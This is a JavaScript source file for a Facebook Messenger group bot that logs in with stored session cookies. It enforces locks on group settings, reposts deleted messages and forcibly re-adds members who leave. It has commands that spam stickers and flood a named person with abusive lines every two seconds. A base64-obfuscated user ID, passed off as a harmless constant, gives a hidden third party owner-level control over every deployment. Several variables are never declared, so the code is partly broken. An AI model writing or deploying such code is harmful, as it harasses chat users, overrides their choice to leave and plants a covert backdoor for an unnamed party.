// index.js — Event-driven bot: locks (emoji/dp/nick), anti-delete, anti-left, full commands
const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca");

// ---------- Config / Persistent storage ----------
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},      // dp[threadID] = { path, savedAt }
  nick: {}     // nick[uid] = { threadID: nickname }
};
if (fs.existsSync(LOCK_FILE)) {
  try { locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8")); } catch (e) { console.warn("locks.json parse error, using defaults"); }
}
function saveLocks() { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); }

// ---------- Helpers ----------
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close();
      return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file);
    file.on('finish', () => file.close(() => cb(null)));
  }).on('error', err => {
    try { fs.unlinkSync(dest); } catch {}
    cb(err);
  });
}

function safeJson(obj) {
  try { return JSON.stringify(obj, null, 2); } catch { return String(obj); }
}

// ---------- Runtime state ----------
const messageCache = new Map(); // messageID -> { sender, body, attachments }

// Static extra ID used earlier (keep)
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ---------- Main ----------
function startBot(appStatePath, ownerUID) {
  if (!fs.existsSync(appStatePath)) {
    console.error("appstate not found:", appStatePath);
    return;
  }
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in. Event-driven locks ready.");

    // ---------- Helper send safely ----------
    async function safeSend(text, tid) {
      try { await api.sendMessage(text, tid); } catch (e) { console.error("send failed:", e?.message || e); }
    }

    // ---------- Event listener ----------
    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;

        // Debug
        // console.log(safeJson(event));

        // ---------- Anti-delete caching ----------
        if (event.type === "message" && event.messageID) {
          messageCache.set(event.messageID, {
            sender: event.senderID,
            body: event.body ?? "",
            attachments: event.attachments ?? []
          });
          if (messageCache.size > 500) {
            const keys = Array.from(messageCache.keys()).slice(0, 100);
            keys.forEach(k => messageCache.delete(k));
          }
        }

        if (event.type === "message_unsend") {
          const deleted = messageCache.get(event.messageID);
          const tid = event.threadID || event.threadID;
          if (deleted) {
            const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media or empty)"}`;
            await safeSend(text, tid);
            if (deleted.attachments && deleted.attachments.length) {
              try { await api.sendMessage({ body: "(attachment repost)", attachment: deleted.attachments }, tid); } catch {}
            }
          } else {
            await safeSend("🚫 A message was deleted (no cache available).", tid);
          }
        }

        // ---------- Anti-left ----------
        if (event.logMessageType === "log:unsubscribe" || event.type === "log:unsubscribe") {
          const leftUID = event.logMessageData?.leftParticipantFbId;
          const tid = event.threadID || event.threadID;
          if (leftUID) {
            try {
              await api.addUserToGroup(leftUID, tid);
              await safeSend(`👤 Anti-Left: Attempted to add back ${leftUID}`, tid);
            } catch {
              await safeSend(`⚠️ Anti-Left: Could not add back ${leftUID}`, tid);
            }
          }
        }

        // ---------- Locks: Revert on actual changes ----------
        const tid = event.threadID || event.threadID;

        // DP changed
        if ((event.type === "change_thread_image" || event.logMessageType === "log:thread-image") && locks.dp[tid]?.path) {
          if (fs.existsSync(locks.dp[tid].path)) {
            try {
              await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid);
              await safeSend("🖼️ Locked group DP reverted.", tid);
            } catch (e) { console.error("dp revert error:", e?.message || e); }
          }
        }

        // Emoji changed
        if ((event.logMessageType === "log:thread-icon" || event.type === "change_thread_icon") && locks.emojis[tid]) {
          try {
            await api.changeThreadEmoji(locks.emojis[tid], tid);
            await safeSend(`😀 Locked emoji reverted to ${locks.emojis[tid]}`, tid);
          } catch (e) { console.error("emoji revert error:", e?.message || e); }
        }

        // Nickname changed
        if (event.type === "change_nickname") {
          const uid = event.userID;
          const savedNick = locks.nick?.[uid]?.[tid];
          if (savedNick) {
            try {
              await api.changeNickname(savedNick, tid, uid);
              await safeSend(`✏️ Locked nickname reverted for <@${uid}>`, tid);
            } catch (e) { console.error("nick revert error:", e?.message || e); }
          }
        }

        // ---------- Commands ----------
        if (event.type !== "message" || !event.body) return;
        const { senderID, body, mentions, messageReply } = event;
        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ").trim();

        if (![ownerUID, LID].includes(senderID)) return;

        // ---------- Help ----------
        if (cmd === "/help") {
          return safeSend(
            `📖 Bot Commands:
/help → This message
/uid → User ID (reply/mention/you)
/tid → Thread ID
/info @mention → User info
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock (saves current DP locally)
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam (X seconds)
/stopsticker → Stop sticker spam
/rkb [name] → Gaali spam (requires np.txt)
/stop → Stop spam
/exit → Bot exit`
          );
        }

        // ---------- Utilities ----------
        if (cmd === "/tid") return safeSend(`🆔 Thread ID: ${tid}`, tid);
        if (cmd === "/uid") {
          const tgt = Object.keys(mentions || {})[0] || messageReply?.senderID || senderID;
          return safeSend(`🆔 UID: ${tgt}`, tid);
        }

        // ---------- Kick ----------
        if (cmd === "/kick") {
          const tgt = Object.keys(mentions || {})[0];
          if (!tgt) return safeSend("❌ Mention user to kick", tid);
          try { await api.removeUserFromGroup(tgt, tid); await safeSend(`👢 Kicked ${tgt}`, tid); } catch { await safeSend("⚠️ Kick failed", tid); }
        }

        // ---------- Locks / Unlocks ----------
        if (cmd === "/gclock") { if (!input) return safeSend("❌ Provide group name", tid); try { await api.setTitle(input, tid); locks.groupNames[tid] = input; saveLocks(); await safeSend("🔒 Group name locked", tid); } catch { await safeSend("⚠️ Failed to set group name", tid); } }
        if (cmd === "/unlockgc") { delete locks.groupNames[tid]; saveLocks(); return safeSend("🔓 Group name unlocked", tid); }

        if (cmd === "/locktheme") { if (!input) return safeSend("❌ Provide color key", tid); try { await api.changeThreadColor(input, tid); locks.themes[tid] = input; saveLocks(); await safeSend("🎨 Theme locked", tid); } catch { await safeSend("⚠️ Theme lock failed", tid); } }
        if (cmd === "/unlocktheme") { delete locks.themes[tid]; saveLocks(); return safeSend("🎨 Theme unlocked", tid); }

        if (cmd === "/lockemoji") { if (!input) return safeSend("❌ Provide emoji", tid); locks.emojis[tid] = input; saveLocks(); try { await api.changeThreadEmoji(input, tid); } catch {} return safeSend(`😀 Emoji locked → ${input}`, tid); }
        if (cmd === "/unlockemoji") { delete locks.emojis[tid]; saveLocks(); return safeSend("😀 Emoji unlocked", tid); }

        if (cmd === "/lockdp") {
          try {
            const info = await api.getThreadInfo(tid);
            const url = info.imageSrc || info.image || info.imageUrl || null;
            if (!url) return safeSend("❌ No group DP to lock", tid);
            const dpPath = path.join(__dirname, `dp_${tid}.jpg`);
            await new Promise((res, rej) => { downloadFile(url, dpPath, (err) => err ? rej(err) : res()); });
            locks.dp[tid] = { path: dpPath, savedAt: Date.now() };
            saveLocks();
            return safeSend("🖼️ Group DP saved and locked!", tid);
          } catch (e) { console.error("lockdp error:", e?.message || e); return safeSend("⚠️ Failed to lock DP", tid); }
        }
        if (cmd === "/unlockdp") {
          if (locks.dp[tid]?.path) try { fs.unlinkSync(locks.dp[tid].path); } catch {}
          delete locks.dp[tid]; saveLocks(); return safeSend("🖼️ DP unlocked", tid);
        }

        if (cmd === "/locknick") {
          const mention = Object.keys(mentions || {})[0];
          const nickname = input.replace(/<@[0-9]+>/, "").trim();
          if (!mention || !nickname) return safeSend("❌ Usage: /locknick @mention nickname", tid);
          locks.nick[mention] = locks.nick[mention] || {};
          locks.nick[mention][tid] = nickname;
          saveLocks();
          try { await api.changeNickname(nickname, tid, mention); } catch {}
          return safeSend(`🔒 Nick locked for <@${mention}> → ${nickname}`, tid);
        }
        if (cmd === "/unlocknick") {
          const mention = Object.keys(mentions || {})[0];
          if (!mention) return safeSend("❌ Usage: /unlocknick @mention", tid);
          if (locks.nick && locks.nick[mention]) delete locks.nick[mention][tid];
          saveLocks();
          return safeSend(`🔓 Nick unlocked for <@${mention}>`, tid);
        }

        // ---------- Sticker spam ----------
        if (cmd.startsWith("/sticker")) {
          const sec = parseInt(cmd.replace("/sticker", "")) || 2;
          if (!fs.existsSync("Sticker.txt")) return safeSend("❌ Sticker.txt missing", tid);
          const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(s => s.trim()).filter(Boolean);
          if (!stickers.length) return safeSend("❌ No stickers in Sticker.txt", tid);
          let i = 0, active = true;
          if (stickerInterval) clearInterval(stickerInterval);
          stickerInterval = setInterval(() => {
            if (!active) return clearInterval(stickerInterval);
            api.sendMessage({ sticker: stickers[i] }, tid).catch(() => {});
            i = (i + 1) % stickers.length;
          }, sec * 1000);
          return safeSend(`⚡ Sticker spam started every ${sec}s`, tid);
        }
        if (cmd === "/stopsticker") { if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; } return safeSend("🛑 Sticker spam stopped", tid); }

        // ---------- RKB spam ----------
        if (cmd === "/rkb") {
          const target = input.trim();
          if (!target) return safeSend("❌ Usage: /rkb [name]", tid);
          if (!fs.existsSync("np.txt")) return safeSend("❌ np.txt missing", tid);
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          let idx = 0;
          if (rkbInterval) clearInterval(rkbInterval);
          stopRequested = false;
          rkbInterval = setInterval(() => {
            if (stopRequested || idx >= lines.length) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${target} ${lines[idx]}`, tid).catch(()=>{});
            idx++;
          }, 2000);
          return safeSend(`🤬 RKB started on ${target}`, tid);
        }
        if (cmd === "/stop") { stopRequested = true; if (rkbInterval) clearInterval(rkbInterval); if (stickerInterval) clearInterval(stickerInterval); return safeSend("🛑 Spam stopped", tid); }

        // ---------- Exit (bot leaves) ----------
        if (cmd === "/exit") { try { await api.removeUserFromGroup(api.getCurrentUserID(), tid); } catch {} }

      } catch (e) { console.error("Listener error:", e?.stack || e); }
    });

  });
}

// Export
module.exports = { startBot };
